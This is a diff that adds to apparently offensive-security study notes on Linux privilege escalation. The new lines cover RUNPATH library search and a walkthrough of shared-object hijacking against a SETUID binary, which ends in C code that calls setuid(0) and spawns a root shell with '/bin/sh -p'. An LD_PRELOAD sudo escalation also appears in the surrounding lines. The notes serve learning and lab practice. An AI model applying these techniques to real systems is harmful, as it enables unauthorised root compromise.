@@ -625,6 +625,10 @@ searchsploit Ubuntu 18.04
     - `LD_LIBRARY_PATH` : This variable is used to specify additional directories to search for shared libraries at runtime. It overrides the default search path.
 - Default directories: By default, the system looks in /lib and /usr/lib directories for shared libraries.
 - `/etc/ld.so.conf` configuration file: This file contains a list of directories to search for shared libraries.
+- Directories listed in the application’s `RUNPATH` value
+```shell
+readelf -d <binary>  | grep PATH
+```
 
 
 The shared objects required by a binary can be viewed using the ldd utility.
@@ -707,4 +711,58 @@ $ gcc -fPIC -shared -o root.so root.c -nostartfiles
 
 ```shell
 $ sudo LD_PRELOAD=/tmp/root.so openssl
+```
+### Shared Object Hijacking
+
+Consider the following SETUID binary
+```shell
+$ ls -la payroll
+
+-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
+```
+
+check used libraries 
+```shell
+$ ldd payroll
+
+linux-vdso.so.1 =>  (0x00007ffcb3133000)
+libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
+/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
+```
+
+directories in RUNPATH variable are given preference over other directories.
+```shell
+$ readelf -d payroll  | grep PATH
+
+ 0x000000000000001d (RUNPATH)            Library runpath: [/development]
+```
+check the directory if it is writable
+```shell
+ls -la /development/
+```
+we need to find the function name called by the binary.
+```shell
+# copy any other library to the directory or compile a program
+cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
+gcc hello.c -fPIC -shared -o /development/libshared.so
+
+./payroll 
+
+./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
+```
+write a library
+```c
+#include<stdio.h>
+#include<stdlib.h>
+
+void dbquery() {
+    printf("Malicious library loaded\n");
+    setuid(0);
+    system("/bin/sh -p");
+} 
+```
+
+```shell
+$ gcc src.c -fPIC -shared -o /development/libshared.so
 ```
